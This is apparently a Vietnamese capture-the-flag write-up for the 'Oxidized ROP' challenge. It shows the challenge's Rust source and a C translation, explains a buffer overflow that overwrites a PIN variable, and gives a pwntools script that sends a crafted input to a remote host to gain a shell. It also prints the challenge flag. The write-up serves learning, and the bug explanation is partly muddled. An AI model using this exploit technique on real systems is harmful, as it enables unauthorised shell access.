# Oxidized ROP 

- chall cho ta 1 file rust khá lạ 

```rust 
use std::io::{self, Write};

const INPUT_SIZE: usize = 200;
const PIN_ENTRY_ENABLED: bool = false;

struct Feedback {
    statement: [u8; INPUT_SIZE],
    submitted: bool,
}

enum MenuOption {
    Survey,
    ConfigPanel,
    Exit,
}

impl MenuOption {
    fn from_int(n: u32) -> Option<MenuOption> {
        match n {
            1 => Some(MenuOption::Survey),
            2 => Some(MenuOption::ConfigPanel),
            3 => Some(MenuOption::Exit),
            _ => None,
        }
    }
}

fn print_banner() {
    println!("--------------------------------------------------------------------------");
    println!("  ______   _______ _____ _____ ____________ _____    _____   ____  _____  ");
    println!(" / __ \\ \\ / /_   _|  __ \\_   _|___  /  ____|  __ \\  |  __ \\ / __ \\|  __ \\ ");
    println!("| |  | \\ V /  | | | |  | || |    / /| |__  | |  | | | |__) | |  | | |__) |");
    println!("| |  | |> <   | | | |  | || |   / / |  __| | |  | | |  _  /| |  | |  ___/ ");
    println!("| |__| / . \\ _| |_| |__| || |_ / /__| |____| |__| | | | \\ \\| |__| | |     ");
    println!(" \\____/_/ \\_\\_____|_____/_____/_____|______|_____/  |_|  \\_\\\\____/|_|     ");
    println!("                                                                          ");
    println!("Rapid Oxidization Protection -------------------------------- by christoss");
}

fn save_data(dest: &mut [u8], src: &String) {
    if src.chars().count() > INPUT_SIZE {
        println!("Oups, something went wrong... Please try again later.");
        std::process::exit(1);
    }

    let mut dest_ptr = dest.as_mut_ptr() as *mut char;

    unsafe {
        for c in src.chars() {
            dest_ptr.write(c);
            dest_ptr = dest_ptr.offset(1);
        }
    }
}

fn read_user_input() -> String {
    let mut s: String = String::new();
    io::stdin().read_line(&mut s).unwrap();
    s.trim_end_matches("\n").to_string()
}

fn get_option() -> Option<MenuOption> {
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();

    MenuOption::from_int(input.trim().parse().expect("Invalid Option"))
}

fn present_survey(feedback: &mut Feedback) {
    if feedback.submitted {
        println!("Survey with this ID already exists.");
        return;
    }

    println!("\n\nHello, our workshop is experiencing rapid oxidization. As we value health and");
    println!("safety at the workspace above all we hired a ROP (Rapid Oxidization Protection)  ");
    println!("service to ensure the structural safety of the workshop. They would like a quick ");
    println!("statement about the state of the workshop by each member of the team. This is    ");
    println!("completely confidential. Each response will be associated with a random number   ");
    println!("in no way related to you.                                                      \n");

    print!("Statement (max 200 characters): ");
    io::stdout().flush().unwrap();
    let input_buffer = read_user_input();
    save_data(&mut feedback.statement, &input_buffer);

    println!("\n{}", "-".repeat(74));

    println!("Thanks for your statement! We will try to resolve the issues ASAP!\nPlease now exit the program.");

    println!("{}", "-".repeat(74));

    feedback.submitted = true;
}

fn present_config_panel(pin: &u32) {
    use std::process::{self, Stdio};

    // the pin strength isn't important since pin input is disabled
    if *pin != 123456 {
        println!("Invalid Pin. This incident will be reported.");
        return;
    }

    process::Command::new("/bin/sh")
        .stdin(Stdio::inherit())
        .stdout(Stdio::inherit())
        .output()
        .unwrap();
}

fn print_menu() {
    println!("\n\nWelcome to the Rapid Oxidization Protection Survey Portal!                ");
    println!("(If you have been sent by someone to complete the survey, select option 1)\n");
    println!("1. Complete Survey");
    println!("2. Config Panel");
    println!("3. Exit");
    print!("Selection: ");
    io::stdout().flush().unwrap();
}

fn main() {
    print_banner();

    let mut feedback = Feedback {
        statement: [0_u8; INPUT_SIZE],
        submitted: false,
    };
    let mut login_pin: u32 = 0x11223344;

    loop {
        print_menu();
        match get_option().expect("Invalid Option") {
            MenuOption::Survey => present_survey(&mut feedback),
            MenuOption::ConfigPanel => {
                if PIN_ENTRY_ENABLED {
                    let mut input = String::new();
                    print!("Enter configuration PIN: ");
                    io::stdout().flush().unwrap();
                    io::stdin().read_line(&mut input).unwrap();
                    login_pin = input.parse().expect("Invalid Pin");
                } else {
                    println!("\nConfig panel login has been disabled by the administrator.");
                }

                present_config_panel(&login_pin);
            }
            MenuOption::Exit => break,
        }
    }
}

``` 
- để dễ hình dung source thì ta dùng poe.com để dịch sang code C :))) 

```c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define INPUT_SIZE 200

typedef struct {
    unsigned char statement[INPUT_SIZE];
    int submitted;
} Feedback;

typedef enum {
    Survey,
    ConfigPanel,
    Exit
} MenuOption;

MenuOption getMenuOption(int n) {
    switch (n) {
        case 1:
            return Survey;
        case 2:
            return ConfigPanel;
        case 3:
            return Exit;
        default:
            return -1;
    }
}

void print_banner() {
    printf("--------------------------------------------------------------------------\n");
    printf("  ______   _______ _____ _____ ____________ _____    _____   ____  _____  \n");
    printf(" / __ \\ \\ / /_   _|  __ \\_   _|___  /  ____|  __ \\  |  __ \\ / __ \\|  __ \\ \n");
    printf("| |  | \\ V /  | | | |  | || |    / /| |__  | |  | | | |__) | |  | | |__) |\n");
    printf("| |  | |> <   | | | |  | || |   / / |  __| | |  | | |  _  /| |  | |  ___/ \n");
    printf("| |__| / . \\ _| |_| |__| || |_ / /__| |____| |__| | | | \\ \\| |__| | |     \n");
    printf(" \\____/_/ \\_\\_____|_____/_____/_____|______|_____/  |_|  \\_\\\\____/|_|     \n");
    printf("                                                                          \n");
    printf("Rapid Oxidization Protection -------------------------------- by christoss\n");
}

void save_data(unsigned char* dest, const char* src) {
    if (strlen(src) > INPUT_SIZE) {
        printf("Oups, đã xảy ra lỗi... Vui lòng thử lại sau.\n");
        exit(1);
    }

    strcpy((char*)dest, src);
}

char* read_user_input() {
    char* input = malloc(INPUT_SIZE * sizeof(char));
    fgets(input, INPUT_SIZE, stdin);
    input[strcspn(input, "\n")] = '\0';
    return input;
}

MenuOption get_option() {
    int n;
    scanf("%d", &n);

    return getMenuOption(n);
}

void present_survey(Feedback* feedback) {
    if (feedback->submitted) {
        printf("Khảo sát với ID này đã tồn tại.\n");
        return;
    }

    printf("\n\nXin chào, nhà xưởng của chúng ta đang trải qua hiện tượng oxy hóa nhanh chóng. Vì chúng tôi đặt sức khỏe và an toàn làm ưu tiên hàng đầu tại nơi làm việc, chúng tôi đã thuê dịch vụ Bảo vệ Oxy hóa Nhanh (ROP - Rapid Oxidization Protection) để đảm bảo an toàn cấu trúc của nhà xưởng. Họ muốn mỗi thành viên trong nhóm đưa ra một tuyên bố ngắn về tình trạng của nhà xưởng. Điều này hoàn toàn bảo mật. Mỗi phản hồi sẽ được liên kết với một số ngẫu nhiên không liên quan đến bạn.\n\n");

    printf("Tuyên bố (tối đa 200 ký tự): ");
    fflush(stdout);
    char* input_buffer = read_user_input();
    save_data(feedback->statement, input_buffer);
    free(input_buffer);

    printf("\n%s\n", "--------------------------------------------------------------------------");

    printf("Cảm ơn bạn đã đưa ra tuyên bố! Chúng tôi sẽ cố gắng giải quyết các vấn đề sớm nhất có thể! Vui lòng thoát khỏi chương trình.\n");

    printf("%s\n", "--------------------------------------------------------------------------");

    feedback->submitted = 1;
}

void present_config_panel(const unsigned int* pin) {
    // Sức mạnh của mã PIN không quan trọng vì đầu vào PIN đã bị tắt
    if (*pin != 123456) {
        printf("PIN không hợp lệ. Sự cố này sẽ được báo cáo.\n");
        return;
    }

    // Thực thi lệnh shell
    system("/bin/sh");
}

void print_menu() {
    printf("\n\nChào mừng bạn đến với Trang web Khảo sát Bảo vệ Oxy hóa Nhanh!                \n");
    printf("(Nếu bạn được gửi bởi ai đó để hoàn thành khảo sát, hãy chọn tùy chọn 1)\n\n");
    printf("1. Hoàn thành khảo sát\n");
    printf("2. Bảng cấu hình\n");
    printf("3. Thoát\n");
    printf("Chọn: ");
    fflush(stdout);
}

int main() {
    print_banner();

    Feedback feedback;
    memset(&feedback, 0, sizeof(feedback));
    unsigned int login_pin = 0x11223344;

    while (1) {
        print_menu();
        MenuOption option = get_option();

        switch (option) {
            case Survey:
                present_survey(&feedback);
                break;
            case ConfigPanel:
                present_config_panel(&login_pin);
                break;
            case Exit:
                printf("Cảm ơn bạn đã sử dụng chương trình. Tạm biệt!\n");
                return 0;
            default:
                printf("Lựa chọn không hợp lệ. Vui lòng chọn lại.\n");
                break;
        }
    }

    return 0;
}
``` 
- option 1 nhập statement 200byte và option 2 check pin = 123456 thì tạo shell 
- bug khá khó thấy là ở option 1 phải nhập vào input_buffer nằm trên stack trước rồi mới gán vào statement, mà login_pin cũng nằm trên stack luôn nên có thể orw được 

```c 
    char* input_buffer = read_user_input();
    save_data(feedback->statement, input_buffer);
    free(input_buffer);
```
- do debug được để xem addr thằng login_pin nên mình sẽ orw 200 byte chr(123456) luôn để chắc chắn đúng 
- và ta đã có được shell 

![image](https://github.com/gookoosss/CTF/assets/128712571/29dcd0d4-483c-4017-a3ed-3de8148611a2)


## script 

```python 
from pwn import *

context.binary = exe = ELF('./oxidized-rop',checksec=False)


p = process(exe.path)
p = remote('159.65.20.166', 31982)

p.sendlineafter(b'Selection: ',b'1')

p.sendlineafter(b'characters): ',chr(123456)*200)

p.sendlineafter(b'Selection: ',b'2')

p.interactive()

# HTB{7h3_0r4n63_cr4b_15_74k1n6_0v3r!}
```
